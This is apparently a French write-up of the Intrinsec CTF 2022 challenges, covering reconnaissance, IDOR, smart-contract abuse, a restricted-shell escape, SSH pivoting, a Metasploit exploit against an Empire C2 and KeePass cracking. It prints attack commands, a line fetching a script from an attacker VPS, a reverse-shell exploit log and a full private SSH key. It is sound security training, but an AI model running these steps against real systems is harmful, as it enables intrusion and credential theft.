---
title: "Intrinsec CTF 2022 | leHack 2022 Edition"
date: 2022-06-30T12:00:00Z
description: "Writeup complet de tous les challenges du Intrinsec CTF 2022"
categories: ["writeup"]
tags: ["network","tuto"]
keywords: ["network", "pivoting","ssh","ctf","Intrinsec","ctftime","unbreakable"]
---

# Description
Ce CTF est proposé par [Intrinsec](https://www.intrinsec.com/) , crée par [Th1b4ud](https://twitter.com/th1b4ud) et est constitué de ``12 Challenges``.
On évolue tout au long des objectifs dans un réseau afin de compromettre toutes les machines les unes après les autres.


# Thèmes
- Web
- Pivoting
- Blockchain (SmartContract)
- Forensic

# Prérequis
- Du temps
- Un vps de préférence
- Connaissance basique de CTF

*J'ai appris beaucoup de choses pendant la compétition et c'est assez facile à comprendre en faisant les challenges en parallèles. *

# MISC *(Intro : 2 Challenges)*

## Discord

- **Nom**  : Discord
- **Point** : 1
- **Description** : Have you visited our wonderful discord server ? :) [https://discord.gg/p8z4dCtAtk](https://discord.gg/p8z4dCtAtk)

###### Solution :
On se rend sur leur Discord. On va dans la section ``general``. Le flag est en haut de l'écran :   
```
Mayve this string will help you : ISEC{1l0v3D1sc0rd}
```

---

## Rules

- **Nom**  : Rules
- **Point** : 1
- **Description** :Have you read the rules?

###### Solution :
On se rend sur la page [/rules](https://challenge.intrinsec.io/rules) puis on inspecte le code la page .  
```
<!-- Good boy here your flag : ISEC{Ir34d3v3ryth1ng!} -->
```

# MAIN OBJECTIVE *(6 Challenges)*

## First !

- **Nom**  : "1 First !"
- **Point** : 10
- **Description** :
  ```bash
  Our analysts found this IP : 20.126.99.66.
  We are convinced that this address is part of their infrastructure. See if it is not possible to enter through there.


###### Solution :
La première chose à faire est de lancer un nmap sur l'ip :
```bash
root@DESKTOP-HNQJECB: /c
➜   nmap 20.126.99.66
...
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp open     ppp
8000/tcp open     http-alt
```

On peut se rendre sur les 3 pages des 3 derniers ports. Le premier étant un ssh pour l'administration du CTF :

![AltText](./img/1_port.png)

On a :
- Une page **qui ressemble à une page de Microsoft office**
- Un login pour une banque
- Un PhpMyAdmin

On trouve un ``robots.txt`` sur le port **80**.
```
Flag-1 : ISEC{h0_y0u_F0und_M3!}
```

---

## Bad practices

- **Nom**  : Bad practices
- **Point** : 20
- **Description** : They don't seem to use good practices.

###### Solution :

En inspectant la page sur le ``port 80``, on se rend compte de deux choses :
- Ce texte ``<!-- <meta name="dev-platform" content="dev.phishing.lan"> -->``
- Ce Code ``<form method="GET" action="../../harvester.php" name="LoginForm" autocomplete="off">``

Ce site est en réalité une fausse page !
Essayons de regarder ce qu'il se passe si on spécifie un ``Host`` en Header en lui mettant la valeur  ``dev.phishing.lan``

```bash
curl 20.126.99.66 > original.html
curl 20.126.99.66 -H 'Host:dev.phishing.lan' > original_with_header.html
diff original.html original_with_header.html
```  
Résultat :
```bash
<!-- Dev version. Remove backup files and /pages directory before move to production. Ty -->
```

Super ! On apprend l'existence d'une backup !
```bash
curl 20.126.99.66/backup/backup -H 'Host:dev.phishing.lan'
```  

Résultat :
```bash
#!/bin/bash
BACKUPTIME=`date +%b-%d-%y`
RANDOM_STRING=`head /dev/urandom | tr -dc a-f0-9 | head -c 40`
DESTINATION=backup-'$BACKUPTIME'-'$RANDOM_STRING'.tar.gz
SOURCEFOLDER=.
tar -cpzf $DESTINATION $SOURCEFOLDER
```

Il y a ici un problème dans le script , ``RANDOM_STRING`` et ``BACKUPTIME`` ne sont pas exécutés , elles sont entre `` ` `` .
On peut donc aller chercher la backup !:
```bash
curl -H 'Host:dev.phishing.lan' 'http://20.126.99.66/backup/backup-$BACKUPTIME-$RANDOM_STRING.tar.gz'*
```

Dedans on trouve :
```bash
-rwxrwxrwx 1 root root 127K Feb 10  2020 aad.login.js
-rwxrwxrwx 1 root root  211 Feb 28  2020 backup
-rwxrwxrwx 1 root root  11K Feb 10  2020 favicon_a.ico
-rwxrwxrwx 1 root root   32 Feb 28  2020 flag.txt
-rwxrwxrwx 1 root root  632 Feb 12  2020 harvester.php
-rwxrwxrwx 1 root root 7.3K Feb 12  2020 index.php
-rwxrwxrwx 1 root root  85K Feb 10  2020 jquery.1.5.1.min.js
-rwxrwxrwx 1 root root  85K Feb 10  2020 jquery.1.5.1.min.js.1
-rwxrwxrwx 1 root root 8.5K Feb 10  2020 jquery.easing.1.3.js
-rwxrwxrwx 1 root root  26K Feb 10  2020 login.ltr.css
-rwxrwxrwx 1 root root 9.4K Feb 10  2020 logon.css
drwxrwxrwx 1 root root 4.0K Jun 30 14:02 pages
```

On obtient un 2nd Flag :

```bash
root@DESKTOP-HNQJECB: /c
➜   cat flag.txt
Flag-2 : ISEC{B4d_d3V_pR4cT1c3}
```

---

## Starting to smell good

- **Nom**  : Starting to smell good...
- **Point** : 20
- **Description** : Can't you get more things?

###### Solution :

Le contenu du fichier ``harvester.php`` est intéressant :
```bash
root@DESKTOP-HNQJECB: /c/a
➜   cat harvester.php
<?php
$dbuser = "user";
$servername = "db";
$dbpass = "x0oKWidv0cz";
$dbname = "phishing";
$redirect = "https://outlook.office365.com";

$conn = mysqli_connect($servername, $dbuser, $dbpass, $dbname);
$password = mysqli_real_escape_string($conn, $_GET['password']);
$email = mysqli_real_escape_string($conn, $_GET['email']);
```

Grâce à ces Creds , on peut aller se connecter sur le MySql sur le port 8000 et ainsi obtenir le flag dans la DB :)

![AltText](./img/mysql.png)

---

## Strange bank

- **Nom**  : Strange bank
- **Point** : 50
- **Description** : Perfect! Their base is well filled out good work. We are sure they have more secrets.

###### Solution :

Depuis le Mysql , on peut récupérer 3 utilisateurs dans la base de données :
on peut décoder les mots de passe avec [CrackStation](https://crackstation.net/).
```
1 	wtivers 	57024125b8d8c3f6d69f99d7b42e63a71b0bb3f8 : 'phishing'   (first test account)
2 	operator1 ffcbd03577964f021cc34f50fabb7b16094a4051 : 'operator1234' 	(operator1 old account)
3 	jbura    	9bc34549d565d9505b287de0cd20ac77be1d3f2c : 'test1234' 	(second test account)
```

On se connecte Ainsi sur le login du port ``3000`` avec ces Creds :

![AltText](./img/page_contract.png)

On peut voir ici que c'est un chall de Crypto .

On a :
- Le code d'un SmartContract
- Un bouton pour télécharger le code
- Un bouton pour Déployer le SmartContract

On peut inspecter les requêtes avec [``BurpSuite``](https://portswigger.net/burp)

Pour télécharger le contrat, on a :
```
GET /contract/1 HTTP/1.1
Host: 20.126.99.66:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://20.126.99.66:3000/refund
Accept-Encoding: gzip, deflate
Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
```

Il y a une faille de type [``IDOR``](https://portswigger.net/web-security/access-control/idor) sur cette page. En effet, on peut modifier l'indice, le ``1`` de l'url pour obtenir un autre objet.
On peut donc énumérer les différents contrats grâce à l'intruder de Burpsuite.

![AltText](./img/idor1.png)

On obtient ainsi le code de ``5`` nouveaux contrats !
Le numéro **13** est intéressant:

```bash
pragma solidity >=0.4.22 <0.6.0;

contract Refund {
    bool public admin = false;
    uint256 public funds;
    bytes32 private hash = 0x47a89f5ed7e6445e71adde201113005941232bcadade8ce112f6ef671038be04;

    constructor() public payable {
        funds = funds + msg.value;
    }

    function() external payable {
        funds = funds + msg.value;
    }

    function transfer() external {
        msg.sender.transfer(funds);
        funds = 0;
    }

    function login(string memory _password) public{
        if((keccak256(abi.encodePacked(_password)) == hash)){
            admin = true;
        }
    }
}
```

Il semblerait que le contrat ait une fonction ``login`` qui requiert un mot de passe.
Le mot de passe fournit en paramètre de la fonction de connexion et le [``sha3``](https://fr.wikipedia.org/wiki/SHA-3) de celui-ci est comparé au hash codé en dur plus haut.

Ce hash correspond à ``une adresse privée de la Blockchain ethereum``
comme décrit à la page ``/help`` . On peut l'ajouter à Metamask !

![AltText](./img/eth.png)

On retrouve donc l'adresse publique du compte : ``0xf5A82264Ecec7F65DB259548717d9BFF6a148D92``

Enfin grâce à etherscan , on trouve les transactions ! [ici](https://ropsten.etherscan.io/address/0xf5A82264Ecec7F65DB259548717d9BFF6a148D92)

On remarque que la dernière transaction concerne la fonction ``login`` évoquée plus haut.

![AltText](./img/eth2.png)

En cliquant sur ``View Input As UTF-8`` , on obtient le mot de passe passé en paramètre : ``harvester23``

Toujours dans notre exploration, on trouve dans le code source de la page :  

```js
$(document).on('click', '.check', function (event) {
     $.ajax({
       type: 'POST',
       url: '/check',
       data: {
         contractAddress: $(`#instanceAddress`).text()
       },
       success: function (response) {
         $(`#levelKey`).show();
         $(`#levelKey`).text(`${response.responseKey}`);
       },
       error: function (response) {
         $(`#levelKey`).show();
         $(`#levelKey`).text(`There was an error, please try again...`);
       }
     });
   });
```

Voici donc le scénario qu'on peut imaginer pour valider le challenge :

- Déployer le contrat
- Appeler la fonction ``login`` du contrat avec le mot de passe ``harvester23``
- Appelé l'endpoint ``check`` pour obtenir ```${response.responseKey}```

###### Déployer le contrat

En bas de la page de la bank, on peut se *connecter*.
En réalité, aucun mot de passe n'est comparé. C'est ``un faux login.``

On accède à une option ``Deploy refund contract``
Avec **BurpSuite** on récupère la requête et de la même manière que pour le téléchargement : il existe une **vulnérabilité IDOR** qui permet de **déployer le contrat 13** au lieu du contrat N°1

![AltText](./img/eth3.png)
Nous avons maintenant l'adresse du contrat : *0x626BB1a4d1630291F1075d4AbD8b0075be306934*

###### Appeler le contrat

On va utiliser [**RopStenCTF**](https://github.com/wlayzz/RopstenCtf) , un outil de [Wlayzz](https://twitter.com/Wlayzz) qui permet d'interagir avec ce genre de contrat !

D'abord, on va récupérer une clé api sur https://infura.io/ pour interagir avec la Blockchain Ropsten Ethereum .

On setup notre Wallet au tool :

```bash
root@DESKTOP-HNQJECB: /c/RopstenCtf git:(master) ✗
➜   ./RopstenCtf.py wallet --provider-key f4ea35f577f14494b67fXXXXXXXXXXXX  --generate

  ___             _            ___ _    __
 | _ \___ _ __ __| |_ ___ _ _ / __| |_ / _|
 |   / _ | '_ (_-|  _/ -_| ' | (__|  _|  _|
 |_|_\___| .__/__/\__\___|_||_\___|\__|_|   by @Wlayzz
         |_|

[INFO] Provider key saved in .env file
[+] Connected to ropsten network
[INFO] Your secret key is 0x13af12d9f7c211e29caac1b7bec12f0c874fXXXXXXXXXXXXXXXXXXXXX (keep this secret)
[INFO] Your public adress is 0xF184008adeB767e0E869ffXXXXXXXXXXXXXXXXXXXXX
[INFO] These informations are stored in .env file and will be used for smart contract interactions
[INFO] You can claim $rETH unsing this faucet: https://faucet.egorfine.com/
```

On Compile le SmartContract pour avoir le .abi et pouvoir ainsi appeler  le contrat:

```bash
root@DESKTOP-HNQJECB: /c/RopstenCtf git:(master) ✗
➜   ./RopstenCtf.py contract --compile -f Refund.sol

  ___             _            ___ _    __
 | _ \___ _ __ __| |_ ___ _ _ / __| |_ / _|
 |   / _ | '_ (_-|  _/ -_| ' | (__|  _|  _|
 |_|_\___| .__/__/\__\___|_||_\___|\__|_|   by @Wlayzz
         |_|

[+] Connected to ropsten network
Compiler run successful. Artifact(s) can be found in directory Refund.
[+] abi and bin files generated on directory:
        [*] ./Refund/Refund.abi
        [*] ./Refund/Refund.bin
```

On récupère les infos sur le SmartContrat de la blockchain ropsten :

```bash
root@DESKTOP-HNQJECB: /c/RopstenCtf git:(master) ✗
➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --info --abi ./Refund/Refund.abi

  ___             _            ___ _    __
 | _ \___ _ __ __| |_ ___ _ _ / __| |_ / _|
 |   / _ | '_ (_-|  _/ -_| ' | (__|  _|  _|
 |_|_\___| .__/__/\__\___|_||_\___|\__|_|   by @Wlayzz
         |_|

[+] Connected to ropsten network
[INFO] Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
[+] List of functions:
        [*] admin()
        [*] funds()
        [*] login(_password:string)
        [*] transfer()
```

On envoie la transaction à l'adresse *0x626BB1a4d1630291F1075d4AbD8b0075be306934* en appelant la fonction ``login`` avec le mot de passe en paramètre ``harvester23``

```bash
root@DESKTOP-HNQJECB: /c/RopstenCtf git:(master) ✗
➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --call --abi ./Refund/Refund.abi -fc login -p harvester23

  ___             _            ___ _    __
 | _ \___ _ __ __| |_ ___ _ _ / __| |_ / _|
 |   / _ | '_ (_-|  _/ -_| ' | (__|  _|  _|
 |_|_\___| .__/__/\__\___|_||_\___|\__|_|   by @Wlayzz
         |_|

[+] Connected to ropsten network
[INFO] Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
[INFO] Inspect transaction here: https://ropsten.etherscan.io/tx/0xfc6cb2e3b27386f453ce1da32bebb3f213a367792d480903a7e4beedccab7438
[INFO] Transaction done
[+] Reponse login(harvester23):
        [*] Transaction status: success
```

On regarde si ``admin`` est bien à ``true``

```bash
root@DESKTOP-HNQJECB: /c/RopstenCtf git:(master) ✗
➜   ./RopstenCtf.py contract --address 0x626BB1a4d1630291F1075d4AbD8b0075be306934 --view --abi ./Refund/Refund.abi -fc admin

  ___             _            ___ _    __
 | _ \___ _ __ __| |_ ___ _ _ / __| |_ / _|
 |   / _ | '_ (_-|  _/ -_| ' | (__|  _|  _|
 |_|_\___| .__/__/\__\___|_||_\___|\__|_|   by @Wlayzz
         |_|

[+] Connected to ropsten network
[INFO] Inspect contract at https://ropsten.etherscan.io/address/0x626BB1a4d1630291F1075d4AbD8b0075be306934
[INFO] Calling function done
[+] Reponse admin(): True
```

###### Récupérer la clé sur /check

D'après le code **JavaScript** :

```js
$(document).on('click', '.check', function (event) {
     $.ajax({
       type: 'POST',
       url: '/check',
       data: {
         contractAddress: $(`#instanceAddress`).text()
       },
       success: function (response) {
         $(`#levelKey`).show();
         $(`#levelKey`).text(`${response.responseKey}`);
       },
       error: function (response) {
         $(`#levelKey`).show();
         $(`#levelKey`).text(`There was an error, please try again...`);
       }
     });
   });
```

Il faut faire une requête **POST** avec en data ``instanceAddress`` et l'adresse du Contract
Avec burp , on obtient le résultat suivant :

![AltText](./img/ssh_key.png)

```json
{"responseKey":"\nWelcome back Admin. Reminder of harvest creds :<br>\n- Username : harvester<br>\n- Key :<br>\n-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEA2ZF5CXjpJEXz3SNr7Ol7BvL3F5fiQgtqsc46nOY8ZQ0IZxmcIo2G\nRJIIYn1fEC/IU0qcgyWtzE+GYrusKdxL8oJ6A8d8zYkqkoZKkwn4QCRHAU9WS0NJfxpM4M\nsp4DEkAMmuFnoVNftQ3r7NZnBlYg9Jf6djiTp1GAfnSAxTzNEWZBhoiGI9/q7sL0AW49V7\nw5183/Rj/sM4kGmr469DStZJFWSPGKObvY1YS3IXV9j16+QN+usrVQVBZQWFz+NR98puwK\n7GppFxf23np8Nb0OoneWoGGCNhbV5VLq84vSIjkO+t5M556+WiRJMe6sZuCQQ09hTlf6jA\nn5Rp29oasQAAA9AEQyW/BEMlvwAAAAdzc2gtcnNhAAABAQDZkXkJeOkkRfPdI2vs6XsG8v\ncXl+JCC2qxzjqc5jxlDQhnGZwijYZEkghifV8QL8hTSpyDJa3MT4Ziu6wp3EvygnoDx3zN\niSqShkqTCfhAJEcBT1ZLQ0l/GkzgyyngMSQAya4WehU1+1Devs1mcGViD0l/p2OJOnUYB+\ndIDFPM0RZkGGiIYj3+ruwvQBbj1XvDnXzf9GP+wziQaavjr0NK1kkVZI8Yo5u9jVhLchdX\n2PXr5A366ytVBUFlBYXP41H3ym7ArsamkXF/beenw1vQ6id5agYYI2FtXlUurzi9IiOQ76\n3kznnr5aJEkx7qxm4JBDT2FOV/qMCflGnb2hqxAAAAAwEAAQAAAQEAoOIPzM9aJ3aK5AWj\ncycb0IGt8gZgS1JB7YWAljEyi87dXc/0QyDAHsiV5q6qsz+CNQVBQ0GDiUdtKml43+OFTa\njqLQ1A3oQFtSAU2TJQHq40y2UtfK4fFRwPqVLSfnQYGXUJhJl2Qdq7bFtPa+bFMYP4Z6sR\n0ZImsER35DEpbpP5gH1MpNVykBX7xdCz4xE2AE29hgPG8TdtW5eA5hBW++uHiWQvVmjyEm\n5kWB/qeJGT6ngXwms4Mh9ytwDMsIcFoxdNoW6DhixfGoqlJUtKFbAY9LFf5j4NzDa8l/wa\nndGxcZcujOCgZQCuEzcYzwUWKaqAikDv8Q1hl2iubtalIQAAAIAfaxGIcU2Ds+hzsVb07+\nheTf5elyC82v1Wz+LYQUojdAHsJynmLSbhYEfOrunLxkwPl+lEOGqrjnGPd82OLbSdXLIc\nPJ13EOsK0jlvQG3VorhpiybRaBXucRLD8FFNTozRt77HY3DDqRdNtZFdIoW6K/UqHx5bJK\nfZIgXdZNekhgAAAIEA8lRIB5S2HZTjD33tucWrX0ktGUojKWl58on77KlftrOmWSrIg4kb\nmVAN2+jIGxnFmipiQPFBPZT4ClL0T7nuVkzYRA3BHrd2D2bqdKSMrg8pk4uMeKI22U7Fh8\nmLvZCfNXBcsR2fNHodVF8cm2MfA1JlP2cgcnpmLVznNfLGRIUAAACBAOXXl+9C63eDb0V3\ndG/3iy/rn30UboPjZteFRyEgCiciOvAs+u+aQ4kKFvOusuNxpJ0fBIJ3qUKG7bzU1c5XWw\n+f2QdlwBr2PScV5QolF9p5JhUwAB45WDhnxGDrrg8NYqh3LrxPbKWmr6k7K6EMPrjj5h+y\nuFgXKSRVpluFZts9AAAAFmhhcnZlc3RlckBmNzUyNWE3MTA2NjgBAgME\n-----END OPENSSH PRIVATE KEY-----"}
```

**PARFAIT !** , une clé SSH :)

 Malheureusement, **le port 22** n'accepte pas nôtre connexion . Refaisons un nmap avec l'options **-p-**

```bash
root@DESKTOP-HNQJECB: /root/Desktop
➜   nmap 20.126.99.66 -p-
...
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
3000/tcp  open  ppp
8000/tcp  open  http-alt
45236/tcp open  unknown
```

On trouve un port élevé que nous n'avions pas avant : ``45236``

On peut se connecter en ssh :
```bash
sudo chmod 400 ./id_rsa
ssh -i ./id_rsa -p 45236 harvester@20.126.99.66
```

Et HOP !  Un shell
![AltText](./img/rbash.png)

On peut lire le flag : Enfin !!!!!!!!!!!

```bash
harvester:~$ ls
current-log.log  flag-4.txt  host_discovered  root@10.10.99.124
harvester:~$ cat flag-4.txt
Flag 4 : ISEC{pR150n_8re4k}
harvester:~$
```

---

## Where am I

- **Nom**  : Where am I...
- **Point** : 30
- **Description** : You're in! Explore their infrastructure and bring back as much information as possible to take them down.

###### Solution:

La première chose est d'``escape`` le **lbash** .
On peut lister les commandes possibles :
```bash
harvester:~$ help
cat  cd  clear  echo  exit  help  history  lpath  ls  lsudo  pwd
```

D'après [cette page](https://netsec.ws/?p=337) on peut escape le lbash facilement :
```bash
harvester:~$ echo os.system('/bin/bash')
harvester@harvester:~$ id
uid=1000(harvester) gid=1000(harvester) groups=1000(harvester)
harvester@harvester:~$
```

On peut importer des fichiers sur le ssh de la manière suivante :
```bash
python2 -c "from urllib import urlretrieve; urlretrieve('https://VPS_IP/linpeas.sh', '/tmp/linpeas.sh')"
```

Malheureusement, je n'ai pas trouvé de **privesc** simple à faire.
Par contre, on trouve quelque chose de très intéressant !

```bash
╔══════════╣ Hostname, hosts and DNS
harvester
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.14.1.2       harvester
192.168.51.2    harvester
search dxlienjzncwejnldfntx3slhac.ax.internal.cloudapp.net
nameserver 127.0.0.11
options ndots:0
```

On a accès à _*2 sous-réseaux*_ :
- **10.14.1.0/24**
- **192.168.51.0/24**

On peut donc quitter puis refaire une connexion ssh mais cette fois, on va utiliser la fonction de [pivoting](https://www.searchevolution.com/security/2021/07/22/pivot-avec-ssh-plink-socat-chisel-ou-sshuttle/) de ssh

```bash
ssh -D 9050  -i ./id_rsa -p 45236 harvester@20.126.99.66
```

Depuis notre shell attaquant, on peut maintenant scanner leur réseau internet grâce à un proxy comme [``Proxychains``](https://doc.ubuntu-fr.org/proxychains)

Après les nmaps sur les 2 réseaux. On obtient :

```bash
Nmap scan report for 192.168.51.2
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) #Inconnu

Nmap scan report for 192.168.51.3
5432/tcp open       PostgreSQL DB 9.6.0 or later

Nmap scan report for 192.168.51.5
22/tcp   open  ssh
80/tcp   open  http             # GITLAB
8181/tcp open  intermapper      # Gestion de serveur = intermapper

Nmap scan report for 10.14.1.1 // 192.168.51.1
22/tcp   open  ssh
80/tcp   open  http             # Page Phising microsoft
3000/tcp open  ppp              # Login Custom
8000/tcp open  http-alt         # phpmyadmin

Nmap scan report for 10.14.1.2
2048/tcp open  caldav  # Intéressant
```

On peut en déduire le shéma réseau ci contre :

![AltText](./img/network.png)


La dernière IP : **10.14.1.2** sur le port **2048** semble intéressante.
```bash
root@localhost:/home/vozec# proxychains curl 10.14.1.2:2048
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-10.14.1.2:2048-<><>-OK
<html>
  <body>
    <h1>It works!</h1>
    <p>This is the default web page for this server.</p>
    <p>The web server software is running but no content has been added, yet.</p>
    <p>Flag 5 : ISEC{P0r7_5c4nn1g_iS_3asY}</p>
    <p>The EMPIRE Stikes Back !</p>
  </body>
</html>
```

HOP le flag !

---

## Stop the agents

- **Nom**  : Stop the agents
- **Point** : 30
- **Description** :
  ```bash
  As you can see, security does not seem to be a priority for them. It is unlikely that their C2 is really up to date. Find a vulnerability or vulnerabilities on it and bring back root access.
  Finish the work !
  ```
###### Solution :

Après plusieurs heures de recherches. J'ai trouvé [cet article](https://www.tenable.com/blog/identifying-empire-http-listeners) ainsi que [cette documentation](https://support.alertlogic.com/hc/en-us/articles/360004032471-PowerShell-Empire-Post-Exploitation-Framework-HTTP-based-C2-Communications).

On remarque que le nmap nous renvoie un **http-server-header** égale à **Microsoft-IIS/7.5** comme mentionné dans l'article.

```bash
Nmap scan report for 10.14.1.3
PORT     STATE SERVICE VERSION
2048/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: WAP|phone
Running: Linux 2.4.X|2.6.X, Sony Ericsson embedded
OS CPE: cpe:/o:linux:linux_kernel:2.4.20 cpe:/o:linux:linux_kernel:2.6.22 cpe:/h:sonyericsson:u8i_vivaz
OS details: Tomato 1.28 (Linux 2.4.20), Tomato firmware (Linux 2.6.22), Sony Ericsson U8i Vivaz mobile phone
```

De plus, ce texte est le texte par défaut d'un [**C2**](https://www.wikiwand.com/fr/Command_and_Control) nommé [**Empire**](https://github.com/BC-SECURITY/Empire) et il ressemble énormément à celui qu'on à trouvé au challenge précédent .

```html
<html>
  <body>
    <h1>It works!</h1>
    <p>This is the default web page for this server.</p>
    <p>The web server software is running but no content has been added, yet.</p>
  </body>
</html>
```

La description nous parle d'une vieille version de ce **C2** qui n'est pas à jour.
Si on regarde de plus prêt, on trouve un ``exploit`` sur [``metasploit``](https://www.metasploit.com/) qui permet d'obtenir un shell :

```bash
proxychains msfconsole -q
use exploit/linux/http/empire_skywalker
set RHOSTS 10.14.1.3
set RPORT 2048
exploit
```

Résultats :  
```bash
msf6 exploit(linux/http/empire_skywalker) > exploit

[*] Started reverse TCP handler on 194.233.164.121:4444
|S-chain|-<>-127.0.0.1:9050-<><>-10.14.1.2:2048-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-10.14.1.2:2048-<><>-OK
[+] Successfully negotiated an artificial Empire agent
[*] Writing payload to /tmp/dwxCKALX
|S-chain|-<>-127.0.0.1:9050-<><>-10.14.1.2:2048-<><>-OK
[*] Writing cron job to /etc/cron.d/DVRDDTYW
|S-chain|-<>-127.0.0.1:9050-<><>-10.14.1.2:2048-<><>-OK
[*] Waiting for cron job to run, can take up to 60 seconds
[*] Sending stage (40132 bytes) to 20.126.99.66
[+] Deleted /etc/cron.d/DVRDDTYW
[+] Deleted /tmp/dwxCKALX
[+] Deleted /agent.log
[*] Meterpreter session 1 opened (XXX.XXX.XXX.XXX:4444 -> 20.126.99.66:57266) at 2022-06-30 14:49:02 +0000
```

On peut lire le flag !

```bash
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  0     fil   2022-06-30 14:45:01 +0000  .bash_history
100644/rw-r--r--  570   fil   2010-01-31 11:52:26 +0000  .bashrc
040700/rwx------  4096  dir   2022-06-30 08:43:29 +0000  .cache
100644/rw-r--r--  148   fil   2015-08-17 15:30:33 +0000  .profile
040700/rwx------  4096  dir   2022-06-30 08:43:52 +0000  .ssh
100644/rw-r--r--  209   fil   2022-06-30 08:43:54 +0000  .wget-hsts
100644/rw-r--r--  151   fil   2022-06-23 11:36:09 +0000  TODO.md
100644/rw-r--r--  100   fil   2022-06-23 11:36:08 +0000  flag6.txt

meterpreter > cat flag6.txt
Flag-6 : ISEC{UnRE5trI(Ted_Up1oAd_of_F11e}

Finish the job and bring back the name of these thugs !
```

---

# SECONDARY OBJECTIVES *(4 Challenges)*

## Backup key

- **Nom**  : Bad place
- **Point** : 30
- **Description** : Keep digging on their C2, they must have hidden secrets that we need to know.

###### Solution :

Sur la machine précédente, celle en **10.14.1.3** qui contient le C&C ``Empire``, on trouve :
- **TODO.md**
- **/opt/backup.kdbx**

On va les télécharger via la commande ``download`` de **meterpreter** , on en aura besoin plus tard !

```bash
download TODO.md
download /opt/backup.kdbx
```

Cette partie devient de la Forensic. On a un fichier en ``.kdbx`` et les fans de CTF auront reconnu un ``fichier de mot passe Keepass``

Pour déchiffrer ce fichier et accéder à son contenu, on doit cracker la ``MasterKey``.
On utlise [**keepass2john**](https://gist.github.com/HarmJ0y/116fa1b559372804877e604d7d367bbc) pour obtenir un hash compatible avec [**JohnTheRipper**](https://github.com/openwall/john)


```bash
keepass2john backup.kdbx > hash_masterkey.txt
```

J'ai d'abord essayé de cracker le mot de passe avec [**rockyou.txt**](https://github.com/praetorian-inc/Hob0Rules/blob/master/wordlists/rockyou.txt.gz) mais le mot de passe n'a pas était trouvé ...

Donc j'ai directement utilisé **HashCat** avec une rule et des mots-clés des challenges précédents pour générer une wordlist : [OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules)

```bash
hashcat --force list.txt -r ./OneRuleToRuleThemAll.rule --stdout | sort -u > list-uniq.txt
```

Puis j'ai cracké le hash :
```bash
john --format=KeePass h --wordlist=/tmp/list-uniq.txt
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Will run 16 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:49 6,08% (ETA: 22:08:04) 0g/s 866.5p/s 866.5c/s 866.5C/s almendrapassword123..alohaphising
0g 0:00:03:47 35,41% (ETA: 22:05:20) 0g/s 983.7p/s 983.7c/s 983.7C/s jbu876a..jbu9ra6
operator1234     (backup)
1g 0:00:05:57 DONE (2022-06-28 22:00) 0.002800g/s 955.6p/s 955.6c/s 955.6C/s op-erator1234..operator1234!!!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**operator1234** ...
Super, un mot de passe connu que j'avais déjà AHAHA. J'aurais dû tester les anciens mots de passe avant !

Maintenant, quand j'ouvre le KeePass, j'ai :

![AltText](./img/keypass1.png)

et dans une autre section

![AltText](./img/keypass2.png)

On fait **'Click Droit'** > **'Copier le mot de passe'** et HOP : ``ISEC{N0tG00dH1d1ngPl4C3}``

---

## Final takedown

- **Nom**  : Final takedown
- **Point** : 30
- **Description** :
  ```bash
  It seems that not all their projects are in-house. See what you can do with it. Don't forget that we need to find their identities. Bring back at least one email.

  Flag format : <firstname><lastname>@<maill>.fr
  ```

###### Solution:

On cherche ici un mail . Au challenge précédent , on a récupéré un nom d'utilisateur **Gitlab**/**Github** ainsi que **a clé SSH privée** .
Enfin, dans le fichier **TODO.txt** téléchargé depuis le server **EMPIRE** , on lit :

```
# TODO

- Clean history
- Call operator98 for debug
- Move to private public github repo :
  - ransomware
  - GonnaCry
  - CrackMapExec
  - backdoor_py
```

Parfait ! On a :
- ``Un Username GITLAB``
- ``Sa Clé SSH Privée``
- ``Le Nom des Répository``

On peut donc **cloner** ses répos privés :

```bash
[~/.ssh]$ ssh -T git@github.com
Hi apt54! You've successfully authenticated, but GitHub does not provide shell access.

[~/.ssh]$ GIT_SSH_COMMAND='ssh -i /root/.ssh/id_rsa -o IdentitiesOnly=yes' git clone git@github.com:apt54/backdoor_py.git
Cloning into 'backdoor_py'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 20 (delta 6), reused 20 (delta 6), pack-reused 0
Receiving objects: 100% (20/20), 74.96 KiB | 446.00 KiB/s, done.
